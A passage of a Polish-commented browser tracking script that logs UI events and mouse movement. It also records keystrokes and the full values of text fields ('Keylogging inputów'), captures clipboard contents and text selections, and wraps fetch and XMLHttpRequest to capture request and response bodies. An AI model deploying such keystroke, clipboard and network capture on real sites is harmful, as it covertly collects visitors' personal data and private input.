            track('element_visible', {
              elementId: entry.target.id || null,
              dataTrack: entry.target.dataset.trackView || null,
              tagName: entry.target.tagName,
            });
            observer.unobserve(entry.target); // Raportuj tylko raz
          }
        });
      },
      { threshold: 0.5 },
    ); // Element widoczny w 50%

    // Automatycznie obserwuj elementy z atrybutem data-track-view
    document.querySelectorAll('[data-track-view]').forEach((el) => {
      observer.observe(el);
    });
  }

  /**
   * AUTOMATYCZNE WYKRYWANIE DYNAMICZNYCH ELEMENTÓW UI
   * Używa MutationObserver do wykrywania modali, toastów, popoverów, sheetów itp.
   */
  function trackDynamicElements() {
    if (!('MutationObserver' in window)) return;

    // Słownik wykrytych elementów (unikamy duplikatów)
    const detectedElements = new WeakSet();

    // Selektory dla różnych typów komponentów UI (shadcn/radix/headless)
    const UI_SELECTORS = {
      // Modale i dialogi
      modal: [
        '[role="dialog"]',
        '[data-slot="dialog-content"]',
        '[data-slot="alert-dialog-content"]',
        '[data-radix-dialog-content]',
        '[data-headlessui-state*="open"]',
        '.modal',
        '[class*="modal"]',
        '[aria-modal="true"]',
      ],
      // Toasty i powiadomienia
      toast: [
        '[data-sonner-toast]',
        '[data-slot="toast"]',
        '[role="alert"]',
        '[class*="toast"]',
        '[class*="notification"]',
        '[data-radix-toast-viewport]',
        '.Toaster',
        'li[data-sonner-toast]',
      ],
      // Sheety (wysuwane panele)
      sheet: [
        '[data-slot="sheet-content"]',
        '[data-radix-sheet-content]',
        '[class*="sheet"]',
        '[class*="drawer"]',
        '[data-state="open"][role="dialog"]',
      ],
      // Popovery i tooltipy
      popover: [
        '[data-slot="popover-content"]',
        '[data-radix-popover-content]',
        '[role="tooltip"]',
        '[data-slot="tooltip-content"]',
        '[data-radix-tooltip-content]',
        '[class*="popover"]',
      ],
      // Menu i dropdowny
      dropdown: [
        '[data-slot="dropdown-menu-content"]',
        '[data-radix-menu-content]',
        '[role="menu"]',
        '[role="listbox"]',
        '[class*="dropdown"]',
        '[data-radix-collection-item]',
      ],
      // Accordion
      accordion: [
        '[data-slot="accordion-content"]',
        '[data-radix-accordion-content]',
        '[data-state="open"][role="region"]',
      ],
      // Tabs
      tabs: ['[data-slot="tabs-content"]', '[role="tabpanel"]', '[data-radix-tabs-content]'],
      // Select/Combobox
      select: [
        '[data-slot="select-content"]',
        '[data-radix-select-content]',
        '[data-slot="combobox-content"]',
        '[role="listbox"]',
      ],
      // Bannery i alerty
      banner: [
        '[role="banner"]',
        '[class*="banner"]',
        '[class*="alert-banner"]',
        '[data-slot="alert"]',
      ],
    };

    /**
     * Generuje czytelny opis elementu
     */
    function getElementDescription(el) {
      const tag = el.tagName.toLowerCase();
      const id = el.id ? `#${el.id}` : '';
      const classes =
        el.className && typeof el.className === 'string'
          ? '.' + el.className.split(' ').slice(0, 3).join('.')
          : '';
      const text = (el.textContent || '').substring(0, 50).trim();
      const role = el.getAttribute('role');
      const slot = el.dataset?.slot;

      return {
        tag,
        id: el.id || null,
        classes: el.className || null,
        role: role || null,
        slot: slot || null,
        text: text || null,
        ariaLabel: el.getAttribute('aria-label') || null,
      };
    }

    /**
     * Wykrywa typ komponentu UI na podstawie selektorów
     */
    function detectComponentType(el) {
      for (const [type, selectors] of Object.entries(UI_SELECTORS)) {
        for (const selector of selectors) {
          try {
            if (el.matches(selector)) {
              return type;
            }
          } catch (e) {
            // Invalid selector
          }
        }
      }
      return null;
    }

    /**
     * Sprawdza czy element jest widoczny i interaktywny
     */
    function isVisibleElement(el) {
      if (!el.offsetParent && el.style.position !== 'fixed') return false;
      const style = window.getComputedStyle(el);
      return (
        style.display !== 'none' && style.visibility !== 'hidden' && parseFloat(style.opacity) > 0
      );
    }

    /**
     * Obsługuje nowo dodany element
     */
    function handleAddedElement(el) {
      if (detectedElements.has(el)) return;
      if (!isVisibleElement(el)) return;

      const componentType = detectComponentType(el);
      if (!componentType) return;

      detectedElements.add(el);

      const description = getElementDescription(el);

      log(`Wykryto ${componentType}:`, description);

      track('ui_component_open', {
        componentType,
        ...description,
        timestamp: Date.now(),
      });

      // Dla modali, sheetów i toastów - śledź też zamknięcie
      if (['modal', 'sheet', 'toast'].includes(componentType)) {
        trackElementClose(el, componentType, description);
      }

      // Śledź interakcje wewnątrz komponentu
      trackComponentInteractions(el, componentType);
    }

    /**
     * Śledzi zamknięcie elementu
     */
    function trackElementClose(el, componentType, description) {
      const closeObserver = new MutationObserver((mutations) => {
        for (const mutation of mutations) {
          if (mutation.type === 'childList') {
            for (const removedNode of mutation.removedNodes) {
              if (removedNode === el || (removedNode.contains && removedNode.contains(el))) {
                track('ui_component_close', {
                  componentType,
                  ...description,
                  duration: Date.now() - description.timestamp,
                });
                closeObserver.disconnect();
                return;
              }
            }
          }
          // Sprawdź zmianę atrybutu data-state
          if (mutation.type === 'attributes' && mutation.attributeName === 'data-state') {
            const newState = el.getAttribute('data-state');
            if (newState === 'closed') {
              track('ui_component_close', {
                componentType,
                ...description,
                duration: Date.now() - description.timestamp,
              });
              closeObserver.disconnect();
              return;
            }
          }
        }
      });

      // Obserwuj rodzica i sam element
      const parent = el.parentElement || document.body;
      closeObserver.observe(parent, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['data-state'],
      });
    }

    /**
     * Śledzi interakcje wewnątrz komponentu (kliknięcia w przyciski, linki, itp.)
     */
    function trackComponentInteractions(el, componentType) {
      const interactionHandler = (e) => {
        const target = e.target.closest(
          'button, a, input, select, textarea, [role="button"], [role="menuitem"]',
        );
        if (!target) return;

        track('ui_component_interaction', {
          componentType,
          interactionType: e.type,
          targetTag: target.tagName,
          targetText: (target.textContent || target.value || '').substring(0, 50).trim(),
          targetRole: target.getAttribute('role'),
          targetId: target.id || null,
        });
      };

      el.addEventListener('click', interactionHandler, true);
      el.addEventListener('change', interactionHandler, true);
    }

    /**
     * Skanuje dokument w poszukiwaniu istniejących komponentów UI
     */
    function scanExistingComponents() {
      const allSelectors = Object.values(UI_SELECTORS).flat();
      for (const selector of allSelectors) {
        try {
          document.querySelectorAll(selector).forEach((el) => {
            handleAddedElement(el);
          });
        } catch (e) {
          // Invalid selector
        }
      }
    }

    // Główny observer dla całego dokumentu
    const mainObserver = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        // Nowo dodane elementy
        for (const node of mutation.addedNodes) {
          if (node.nodeType !== Node.ELEMENT_NODE) continue;

          // Sprawdź sam element
          handleAddedElement(node);

          // Sprawdź dzieci elementu
          if (node.querySelectorAll) {
            const allSelectors = Object.values(UI_SELECTORS).flat();
            for (const selector of allSelectors) {
              try {
                node.querySelectorAll(selector).forEach((child) => {
                  handleAddedElement(child);
                });
              } catch (e) {
                // Invalid selector
              }
            }
          }
        }

        // Zmiany atrybutów (np. data-state zmienia się na "open")
        if (mutation.type === 'attributes') {
          const el = mutation.target;
          if (el.nodeType === Node.ELEMENT_NODE) {
            const state = el.getAttribute('data-state');
            if (state === 'open') {
              handleAddedElement(el);
            }
          }
        }
      }
    });

    // Uruchom obserwowanie
    mainObserver.observe(document.body, {
      childList: true,
      subtree: true,
      attributes: true,
      attributeFilter: ['data-state', 'aria-hidden', 'aria-expanded', 'open'],
    });

    // Skanuj istniejące elementy po załadowaniu
    if (document.readyState === 'complete') {
      scanExistingComponents();
    } else {
      window.addEventListener('load', scanExistingComponents);
    }

    log('Tracking dynamicznych elementów UI uruchomiony');
  }

  /**
   * Śledzi zmiany w selectach i comboboxach
   */
  function trackSelectChanges() {
    document.addEventListener(
      'change',
      (e) => {
        const target = e.target;

        // Native select
        if (target.tagName === 'SELECT') {
          track('select_change', {
            fieldName: target.name || target.id || null,
            selectedValue: target.value,
            selectedText: target.options[target.selectedIndex]?.text || null,
            optionsCount: target.options.length,
          });
        }
      },
      true,
    );

    // Dla custom selectów (radix/shadcn) - wykrywamy przez kliknięcia w opcje
    document.addEventListener(
      'click',
      (e) => {
        const option = e.target.closest('[role="option"], [data-radix-select-item]');
        if (!option) return;

        track('select_option_click', {
          optionText: (option.textContent || '').trim().substring(0, 50),
          optionValue: option.getAttribute('data-value') || option.dataset.value || null,
          isSelected: option.getAttribute('aria-selected') === 'true',
        });
      },
      true,
    );
  }

  /**
   * Śledzi interakcje z checkboxami i switchami
   */
  function trackToggleElements() {
    document.addEventListener(
      'click',
      (e) => {
        // Checkbox (native i custom)
        const checkbox = e.target.closest(
          'input[type="checkbox"], [role="checkbox"], [data-slot="checkbox"]',
        );
        if (checkbox) {
          const isChecked =
            checkbox.checked !== undefined
              ? checkbox.checked
              : checkbox.getAttribute('aria-checked') === 'true' ||
                checkbox.getAttribute('data-state') === 'checked';

          track('checkbox_toggle', {
            fieldName: checkbox.name || checkbox.id || null,
            checked: !isChecked, // Po kliknięciu stan się zmieni
            label: checkbox.closest('label')?.textContent?.trim().substring(0, 50) || null,
          });
          return;
        }

        // Switch
        const switchEl = e.target.closest('[role="switch"], [data-slot="switch"]');
        if (switchEl) {
          const isOn =
            switchEl.getAttribute('aria-checked') === 'true' ||
            switchEl.getAttribute('data-state') === 'checked';

          track('switch_toggle', {
            fieldName: switchEl.id || null,
            enabled: !isOn, // Po kliknięciu stan się zmieni
            label: switchEl.closest('label')?.textContent?.trim().substring(0, 50) || null,
          });
          return;
        }

        // Radio
        const radio = e.target.closest(
          'input[type="radio"], [role="radio"], [data-slot="radio-group-item"]',
        );
        if (radio) {
          track('radio_select', {
            groupName: radio.name || null,
            value: radio.value || radio.getAttribute('data-value') || null,
            label: radio.closest('label')?.textContent?.trim().substring(0, 50) || null,
          });
        }
      },
      true,
    );
  }

  /**
   * Śledzi zmiany wartości slidera
   */
  function trackSliderChanges() {
    let sliderTimeout;

    document.addEventListener(
      'input',
      (e) => {
        const slider = e.target.closest(
          'input[type="range"], [role="slider"], [data-slot="slider"]',
        );
        if (!slider) return;

        // Debounce - wyślij tylko końcową wartość
        clearTimeout(sliderTimeout);
        sliderTimeout = setTimeout(() => {
          const value = slider.value || slider.getAttribute('aria-valuenow');
          const min = slider.min || slider.getAttribute('aria-valuemin') || 0;
          const max = slider.max || slider.getAttribute('aria-valuemax') || 100;

          track('slider_change', {
            fieldName: slider.id || slider.name || null,
            value: parseFloat(value),
            min: parseFloat(min),
            max: parseFloat(max),
            percentage: Math.round(((value - min) / (max - min)) * 100),
          });
        }, 500);
      },
      true,
    );
  }

  /**
   * Śledzi zmiany tabów
   */
  function trackTabChanges() {
    document.addEventListener(
      'click',
      (e) => {
        const tab = e.target.closest('[role="tab"], [data-slot="tabs-trigger"]');
        if (!tab) return;

        const tabList = tab.closest('[role="tablist"], [data-slot="tabs-list"]');
        const tabIndex = tabList
          ? Array.from(
              tabList.querySelectorAll('[role="tab"], [data-slot="tabs-trigger"]'),
            ).indexOf(tab)
          : -1;

        track('tab_change', {
          tabText: (tab.textContent || '').trim().substring(0, 50),
          tabValue: tab.getAttribute('data-value') || tab.getAttribute('value') || null,
          tabIndex,
          isActive:
            tab.getAttribute('aria-selected') === 'true' ||
            tab.getAttribute('data-state') === 'active',
        });
      },
      true,
    );
  }

  /**
   * Śledzi rozwijanie/zwijanie accordionów
   */
  function trackAccordionChanges() {
    document.addEventListener(
      'click',
      (e) => {
        const trigger = e.target.closest(
          '[data-slot="accordion-trigger"], [role="button"][aria-expanded]',
        );
        if (!trigger) return;

        // Sprawdź czy to accordion
        const accordionItem = trigger.closest(
          '[data-slot="accordion-item"], [data-radix-accordion-item]',
        );
        if (!accordionItem) return;

        const isExpanded =
          trigger.getAttribute('aria-expanded') === 'true' ||
          trigger.getAttribute('data-state') === 'open';

        track('accordion_toggle', {
          itemText: (trigger.textContent || '').trim().substring(0, 100),
          expanded: !isExpanded, // Stan po kliknięciu
          itemIndex: Array.from(trigger.closest('[data-slot="accordion"]')?.children || []).indexOf(
            accordionItem,
          ),
        });
      },
      true,
    );
  }

  /**
   * Śledzi interakcje z linkami (wewnętrzne vs zewnętrzne)
   */
  function trackLinkClicks() {
    document.addEventListener(
      'click',
      (e) => {
        const link = e.target.closest('a[href]');
        if (!link) return;

        const href = link.href;
        const isExternal = href && !href.startsWith(window.location.origin);
        const isDownload = link.hasAttribute('download');
        const isNewTab = link.target === '_blank';

        track('link_click', {
          href: href ? href.substring(0, 200) : null,
          text: (link.textContent || '').trim().substring(0, 50),
          isExternal,
          isDownload,
          isNewTab,
          linkId: link.id || null,
        });
      },
      true,
    );
  }

  /**
   * Śledzi ruch myszy - tworzy heatmapę
   */
  function trackMouseMovement() {
    let moveTimeout;
    let positions = [];

    document.addEventListener(
      'mousemove',
      (e) => {
        positions.push({
          x: e.clientX,
          y: e.clientY,
          t: Date.now(),
        });

        // Ogranicz kolejkę do ostatnich 50 pozycji
        if (positions.length > 50) {
          positions = positions.slice(-50);
        }

        clearTimeout(moveTimeout);
        moveTimeout = setTimeout(() => {
          if (positions.length > 10) {
            track('mouse_path', {
              positions: positions.slice(),
              count: positions.length,
            });
            positions = [];
          }
        }, 2000);
      },
      { passive: true },
    );
  }

  /**
   * Śledzi czas spędzony na stronie i wysyła heartbeat co X sekund
   * UWAGA: Heartbeat jest wysyłany TYLKO gdy użytkownik jest aktywny!
   */
  function trackTimeOnPage() {
    // Aktualizuj licznik co sekundę (tylko gdy aktywny)
    setInterval(() => {
      if (state.isActive) {
        state.timeOnPage = Math.round((Date.now() - state.startTime - state.totalIdleTime) / 1000);
      }
    }, 1000);

    // Wysyłaj heartbeat co X sekund - ALE TYLKO GDY AKTYWNY
    setInterval(() => {
      if (!isTrackingEnabled()) {
        log('Heartbeat pominięty - użytkownik nieaktywny');
        return;
      }

      track('heartbeat', {
        timeOnPage: state.timeOnPage,
        scrollDepth: state.scrollDepth,
        isVisible: document.visibilityState === 'visible',
        isActive: state.isActive,
        totalIdleTime: Math.round(state.totalIdleTime / 1000),
      });
    }, CONFIG.heartbeatInterval);
  }

  /**
   * Śledzi opuszczenie strony i zmianę widoczności
   */
  function trackPageExit() {
    const sendExitEvent = () => {
      track('page_exit', {
        timeOnPage: state.timeOnPage,
        scrollDepth: state.scrollDepth,
      });
      flush();
    };

    // Zamykanie karty/okna
    window.addEventListener('beforeunload', sendExitEvent);
    window.addEventListener('pagehide', sendExitEvent);

    // Zmiana widoczności karty (przełączenie taba)
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'hidden') {
        track('page_hidden', { timeOnPage: state.timeOnPage });
        flush();
      } else {
        track('page_visible', { timeOnPage: state.timeOnPage });
      }
    });
  }

  /**
   * Śledzi błędy JavaScript
   */
  function trackErrors() {
    // Błędy runtime
    window.addEventListener('error', (e) => {
      track('js_error', {
        message: e.message,
        filename: e.filename,
        lineno: e.lineno,
        colno: e.colno,
        stack: e.error?.stack?.substring(0, 500) || null,
      });
    });

    // Nieobsłużone promise rejections
    window.addEventListener('unhandledrejection', (e) => {
      track('promise_rejection', {
        reason: String(e.reason).substring(0, 500),
      });
    });
  }

  /**
   * Śledzi metryki wydajności strony
   */
  function trackPerformance() {
    if (!window.performance || !window.performance.timing) return;

    window.addEventListener('load', () => {
      setTimeout(() => {
        const timing = performance.timing;
        const data = {
          dns: timing.domainLookupEnd - timing.domainLookupStart,
          tcp: timing.connectEnd - timing.connectStart,
          ttfb: timing.responseStart - timing.requestStart,
          download: timing.responseEnd - timing.responseStart,
          domReady: timing.domContentLoadedEventEnd - timing.navigationStart,
          loadComplete: timing.loadEventEnd - timing.navigationStart,
        };

        // Core Web Vitals
        if (performance.getEntriesByType) {
          const paint = performance.getEntriesByType('paint');
          paint.forEach((p) => {
            if (p.name === 'first-contentful-paint') {
              data.fcp = Math.round(p.startTime);
            }
          });
        }

        track('performance', data);
      }, 0);
    });
  }

  /**
   * Śledzi zaznaczanie tekstu
   */
  function trackTextSelection() {
    document.addEventListener('mouseup', () => {
      const selection = window.getSelection();
      const text = selection.toString().trim();

      if (text.length > 3 && text.length < 500) {
        track('text_selection', {
          text: text.substring(0, 200),
          length: text.length,
        });
      }
    });
  }

  /**
   * Śledzi wpisywanie tekstu (Keylogging inputów)
   * Zbiera sekwencje wpisywanych znaków i wysyła je w paczkach
   */
  function trackInput() {
    let inputBuffer = {};
    let inputTimer = null;

    document.addEventListener(
      'input',
      (e) => {
        const target = e.target;
        if (!target.matches('input:not([type="password"]), textarea')) return;

        const fieldKey = (target.id || target.name || 'unknown') + '_' + target.tagName;

        // Jeśli to hasło, ignoruj treść, loguj tylko fakt wpisywania
        if (target.type === 'password' || target.name?.toLowerCase().includes('password')) {
          return;
        }

        // Inicjuj bufor dla tego pola
        if (!inputBuffer[fieldKey]) {
          inputBuffer[fieldKey] = {
            fieldName: target.name || target.id,
            tagName: target.tagName,
            sequence: [],
            startTime: Date.now(),
          };
        }

        // Dodaj znak (lub status) do sekwencji
        // Uwaga: e.data zawiera wpisany znak (null dla backspace/delete w niektórych przypadkach)
        const char = e.data || '[BS/DEL]';
        inputBuffer[fieldKey].sequence.push({
          char: char,
          val: target.value.substring(0, 100), // Podgląd aktualnej wartości (max 100 znaków)
          t: Date.now() - inputBuffer[fieldKey].startTime,
        });

        // Wyślij bufor po chwili bezczynności
        clearTimeout(inputTimer);
        inputTimer = setTimeout(() => {
          for (const key in inputBuffer) {
            const data = inputBuffer[key];
            if (data.sequence.length > 0) {
              track('input_sequence', {
                fieldName: data.fieldName,
                tagName: data.tagName,
                // Zamień tablicę obiektów na czytelniejszy string sekwencji
                typedSequence: data.sequence.map((s) => s.char).join(''),
                fullValue: data.sequence[data.sequence.length - 1].val,
                duration: Date.now() - data.startTime,
                keystrokes: data.sequence.length,
              });
            }
          }
          inputBuffer = {}; // Czyść bufor
        }, 2000); // 2 sekundy po ostatnim znaku
      },
      true,
    );
  }

  // === PRZECHWYTYWANIE KONSOLI I NETWORK ===

  /**
   * Przechwytuje wszystkie logi konsoli (console.log, warn, error, info, debug)
   * Pozwala monitorować co strona loguje do konsoli
   */
  function trackConsoleLogs() {
    const originalConsole = {
      log: console.log,
      warn: console.warn,
      error: console.error,
      info: console.info,
      debug: console.debug,
    };

    // Funkcja pomocnicza do serializacji argumentów konsoli
    function serializeArgs(args) {
      return Array.from(args).map((arg) => {
        try {
          if (arg === null) return 'null';
          if (arg === undefined) return 'undefined';
          if (typeof arg === 'function') return '[Function]';
          if (arg instanceof Error) {
            return {
              type: 'Error',
              name: arg.name,
              message: arg.message,
              stack: arg.stack?.substring(0, 500),
            };
          }
          if (arg instanceof Element) {
            return `[Element: ${arg.tagName}${arg.id ? '#' + arg.id : ''}]`;
          }
          if (typeof arg === 'object') {
            const str = JSON.stringify(arg);
            return str.length > 1000 ? str.substring(0, 1000) + '...[obcięto]' : str;
          }
          return String(arg).substring(0, 500);
        } catch (e) {
          return '[Nie można serializować]';
        }
      });
    }

    // Przechwytywanie console.log
    console.log = function (...args) {
      originalConsole.log.apply(console, args);
      track('console_log', {
        level: 'log',
        args: serializeArgs(args),
        message: args
          .map((a) => String(a))
          .join(' ')
          .substring(0, 500),
      });
    };

    // Przechwytywanie console.warn
    console.warn = function (...args) {
      originalConsole.warn.apply(console, args);
      track('console_log', {
        level: 'warn',
        args: serializeArgs(args),
        message: args
          .map((a) => String(a))
          .join(' ')
          .substring(0, 500),
      });
    };

    // Przechwytywanie console.error
    console.error = function (...args) {
      originalConsole.error.apply(console, args);
      track('console_log', {
        level: 'error',
        args: serializeArgs(args),
        message: args
          .map((a) => String(a))
          .join(' ')
          .substring(0, 500),
      });
    };

    // Przechwytywanie console.info
    console.info = function (...args) {
      originalConsole.info.apply(console, args);
      track('console_log', {
        level: 'info',
        args: serializeArgs(args),
        message: args
          .map((a) => String(a))
          .join(' ')
          .substring(0, 500),
      });
    };

    // Przechwytywanie console.debug
    console.debug = function (...args) {
      originalConsole.debug.apply(console, args);
      track('console_log', {
        level: 'debug',
        args: serializeArgs(args),
        message: args
          .map((a) => String(a))
          .join(' ')
          .substring(0, 500),
      });
    };

    log('Przechwytywanie konsoli włączone');
  }

  /**
   * Przechwytuje wszystkie requesty sieciowe (fetch i XMLHttpRequest)
   * Pozwala monitorować komunikację strony z jej backendem/API
   */
  function trackNetworkRequests() {
    const trackerEndpoint = CONFIG.endpoint; // Endpoint trackera - wykluczamy z logowania

    // === PRZECHWYTYWANIE FETCH ===
    const originalFetch = window.fetch;

    window.fetch = async function (input, init = {}) {
      const startTime = Date.now();
      let url = '';
      let method = 'GET';
      let requestBody = null;
      let requestHeaders = {};

      // Parsowanie URL i metody
      if (typeof input === 'string') {
        url = input;
      } else if (input instanceof Request) {
        url = input.url;
        method = input.method || 'GET';
      } else if (input instanceof URL) {
        url = input.href;
      }

      if (init.method) method = init.method;

      // Przechwytywanie body requestu
      if (init.body) {
        try {
          if (typeof init.body === 'string') {
            requestBody = init.body.substring(0, 2000);
            // Próba parsowania JSON dla czytelności
            try {
              requestBody = JSON.parse(init.body);
            } catch (e) {}
          } else if (init.body instanceof FormData) {
            requestBody = {};
            for (let [key, value] of init.body.entries()) {
              if (value instanceof File) {
                requestBody[key] = `[File: ${value.name}, ${value.size} bytes]`;
              } else {
                requestBody[key] = String(value).substring(0, 200);
              }
            }
          } else if (init.body instanceof URLSearchParams) {
            requestBody = init.body.toString().substring(0, 1000);
          } else {
            requestBody = '[Body: ' + init.body.constructor?.name + ']';
          }
        } catch (e) {
          requestBody = '[Nie można odczytać body]';
        }
      }

      // Przechwytywanie nagłówków
      if (init.headers) {
        try {
          if (init.headers instanceof Headers) {
            init.headers.forEach((value, key) => {
              // Ukryj wrażliwe nagłówki
              if (/auth|token|cookie|key|secret|password/i.test(key)) {
                requestHeaders[key] = '[UKRYTO]';
              } else {
                requestHeaders[key] = value.substring(0, 200);
              }
            });
          } else if (typeof init.headers === 'object') {
            for (const [key, value] of Object.entries(init.headers)) {
              if (/auth|token|cookie|key|secret|password/i.test(key)) {
                requestHeaders[key] = '[UKRYTO]';
              } else {
                requestHeaders[key] = String(value).substring(0, 200);
              }
            }
          }
        } catch (e) {
          requestHeaders = '[Nie można odczytać nagłówków]';
        }
      }

      // Wykluczamy requesty do trackera (żeby nie było pętli)
      const isTrackerRequest = url.includes(trackerEndpoint);

      try {
        const response = await originalFetch.apply(this, arguments);
        const duration = Date.now() - startTime;

        // Klonujemy response żeby móc odczytać body
        const clonedResponse = response.clone();
        let responseBody = null;

        try {
          const contentType = response.headers.get('content-type') || '';
          if (contentType.includes('application/json')) {
            const text = await clonedResponse.text();
            responseBody = text.substring(0, 3000);
            try {
              responseBody = JSON.parse(text);
              // Przytnij duże odpowiedzi
              const respStr = JSON.stringify(responseBody);
              if (respStr.length > 3000) {
                responseBody = respStr.substring(0, 3000) + '...[obcięto]';
              }
            } catch (e) {}
          } else if (contentType.includes('text/')) {
            const text = await clonedResponse.text();
            responseBody = text.substring(0, 1000) + (text.length > 1000 ? '...[obcięto]' : '');
          } else {
            responseBody = `[Typ: ${contentType}]`;
          }
        } catch (e) {
          responseBody = '[Nie można odczytać odpowiedzi]';
        }

        // Loguj request (jeśli nie jest do trackera)
        if (!isTrackerRequest) {
          track('network_request', {
            type: 'fetch',
            method: method.toUpperCase(),
            url: url.substring(0, 500),
            urlParsed: parseUrl(url),
            requestHeaders: requestHeaders,
            requestBody: requestBody,
            status: response.status,
            statusText: response.statusText,
            responseHeaders: parseResponseHeaders(response.headers),
            responseBody: responseBody,
            duration: duration,
            success: response.ok,
          });
        }

        return response;
      } catch (error) {
        const duration = Date.now() - startTime;

        // Loguj błąd requestu
        if (!isTrackerRequest) {
          track('network_request', {
            type: 'fetch',
            method: method.toUpperCase(),
            url: url.substring(0, 500),
            urlParsed: parseUrl(url),
            requestHeaders: requestHeaders,
            requestBody: requestBody,
            status: 0,
            error: error.message,
            duration: duration,
            success: false,
          });
        }

        throw error;
      }
    };

    // === PRZECHWYTYWANIE XMLHttpRequest ===
    const XHR = XMLHttpRequest;
    const originalOpen = XHR.prototype.open;
    const originalSend = XHR.prototype.send;
    const originalSetRequestHeader = XHR.prototype.setRequestHeader;

    XHR.prototype.open = function (method, url, ...args) {
      this._trackerData = {
        method: method,
        url: url,
        headers: {},
        startTime: null,
      };
      return originalOpen.apply(this, [method, url, ...args]);
    };

    XHR.prototype.setRequestHeader = function (name, value) {
      if (this._trackerData) {
        // Ukryj wrażliwe nagłówki
        if (/auth|token|cookie|key|secret|password/i.test(name)) {
          this._trackerData.headers[name] = '[UKRYTO]';
        } else {
          this._trackerData.headers[name] = String(value).substring(0, 200);
        }
      }
      return originalSetRequestHeader.apply(this, arguments);
    };

    XHR.prototype.send = function (body) {
      const xhr = this;
      const trackerData = this._trackerData;

      if (trackerData) {
        trackerData.startTime = Date.now();

        // Przechwytywanie body
        if (body) {
          try {
            if (typeof body === 'string') {
              trackerData.requestBody = body.substring(0, 2000);
              try {
                trackerData.requestBody = JSON.parse(body);
              } catch (e) {}
            } else if (body instanceof FormData) {
              trackerData.requestBody = {};
              for (let [key, value] of body.entries()) {
                if (value instanceof File) {
                  trackerData.requestBody[key] = `[File: ${value.name}]`;
                } else {
                  trackerData.requestBody[key] = String(value).substring(0, 200);
                }
              }
            } else {
              trackerData.requestBody = '[Body: ' + body.constructor?.name + ']';
            }
          } catch (e) {
            trackerData.requestBody = '[Nie można odczytać body]';
          }
        }

        // Wykluczamy requesty do trackera
        const isTrackerRequest = trackerData.url.includes(trackerEndpoint);

        xhr.addEventListener('load', function () {
          if (isTrackerRequest) return;

          const duration = Date.now() - trackerData.startTime;
          let responseBody = null;

          try {
            const contentType = xhr.getResponseHeader('content-type') || '';
            if (contentType.includes('application/json')) {
              responseBody = xhr.responseText.substring(0, 3000);
              try {
                responseBody = JSON.parse(xhr.responseText);
                const respStr = JSON.stringify(responseBody);
                if (respStr.length > 3000) {
                  responseBody = respStr.substring(0, 3000) + '...[obcięto]';
                }
              } catch (e) {}
            } else if (contentType.includes('text/')) {
              responseBody = xhr.responseText.substring(0, 1000);
            } else {
              responseBody = `[Typ: ${contentType}]`;
            }
          } catch (e) {
            responseBody = '[Nie można odczytać odpowiedzi]';
          }

          track('network_request', {
            type: 'xhr',
            method: trackerData.method.toUpperCase(),
            url: trackerData.url.substring(0, 500),
            urlParsed: parseUrl(trackerData.url),
            requestHeaders: trackerData.headers,
            requestBody: trackerData.requestBody,
            status: xhr.status,
            statusText: xhr.statusText,
            responseBody: responseBody,
            duration: duration,
            success: xhr.status >= 200 && xhr.status < 300,
          });
        });

        xhr.addEventListener('error', function () {
          if (isTrackerRequest) return;

          const duration = Date.now() - trackerData.startTime;
          track('network_request', {
            type: 'xhr',
            method: trackerData.method.toUpperCase(),
            url: trackerData.url.substring(0, 500),
            urlParsed: parseUrl(trackerData.url),
            requestHeaders: trackerData.headers,
            requestBody: trackerData.requestBody,
            status: 0,
            error: 'Network Error',
            duration: duration,
            success: false,
          });
        });

        xhr.addEventListener('timeout', function () {
          if (isTrackerRequest) return;

          const duration = Date.now() - trackerData.startTime;
          track('network_request', {
            type: 'xhr',
            method: trackerData.method.toUpperCase(),
            url: trackerData.url.substring(0, 500),
            urlParsed: parseUrl(trackerData.url),
            requestHeaders: trackerData.headers,
            requestBody: trackerData.requestBody,
            status: 0,
            error: 'Timeout',
            duration: duration,
            success: false,
          });
        });
      }

      return originalSend.apply(this, arguments);
    };

    log('Przechwytywanie requestów sieciowych włączone');
  }

  /**
   * Parsuje URL na komponenty
   */
  function parseUrl(url) {
    try {
      const parsed = new URL(url, window.location.origin);
      return {
        protocol: parsed.protocol,
        host: parsed.host,
        pathname: parsed.pathname,
        search: parsed.search,
        searchParams: Object.fromEntries(parsed.searchParams.entries()),
      };
    } catch (e) {
      return { raw: url };
    }
  }

  /**
   * Parsuje nagłówki odpowiedzi
   */
  function parseResponseHeaders(headers) {
    const result = {};
    try {
      if (headers instanceof Headers) {
        headers.forEach((value, key) => {
          result[key] = value.substring(0, 200);
        });
      }
    } catch (e) {}
    return result;
  }

  /**
   * Śledzi operacje schowka (Kopiuj / Wklej / Wytnij)
   */
  function trackClipboard() {
    ['copy', 'cut', 'paste'].forEach((action) => {
      document.addEventListener(
        action,
        (e) => {
          let content = '';
          let length = 0;

          // Próba odczytu danych (ograniczone przez przeglądarkę)
          if (action === 'paste') {
            if (e.clipboardData) {
              content = e.clipboardData.getData('text') || '';
              length = content.length;
              // Dla bezpieczeństwa skracamy
              content = content.substring(0, 50);
            }
          } else {
            // Dla copy/cut bierzemy zaznaczenie
            const selection = window.getSelection();
            content = selection.toString().substring(0, 50);
            length = selection.toString().length;
          }

          track('clipboard_action', {
            action: action,
            targetTag: e.target.tagName,
            contentSnippet: content + (length > 50 ? '...' : ''),
            contentLength: length,
          });
        },
        true,
      );
    });
  }

  // === INICJALIZACJA ===

  /**
   * Główna funkcja inicjalizująca tracker
   */
  async function init() {
    // WAŻNE: Sprawdź czy strona powinna być wykluczona z trackingu
    // Zapobiega śledzeniu samego dashboardu (zapętlenie/sabotaż)
    if (shouldExcludePage()) {
      if (CONFIG.debug) {
        console.log('[Tracker] ⛔ Strona wykluczona z trackingu:', window.location.pathname);
      }
      return; // Nie inicjalizuj trackera na wykluczonej stronie
    }

    // Ustaw ID użytkownika i sesji
    state.visitorId = getVisitorId();
    state.sessionId = getSessionId();

    // Wyślij początkowy event pageview z pełnymi danymi urządzenia
    const deviceInfo = await getExtendedDeviceInfo();

    // Dodatkowe info o domenie (TLD, subdomena)
    const domainParts = window.location.hostname.split('.');
    const domainInfo = {
      full: window.location.hostname,
      tld: domainParts.length > 1 ? domainParts[domainParts.length - 1] : '',
      subdomain: domainParts.length > 2 ? domainParts[0] : 'www',
    };

    track('pageview', {
      device: deviceInfo,
      utm: getUtmParams(),
      domain: domainInfo,
    });

    // Uruchom wszystkie trackery

    // NOWE: Detekcja aktywności użytkownika (idle detection)
    initActivityDetection();

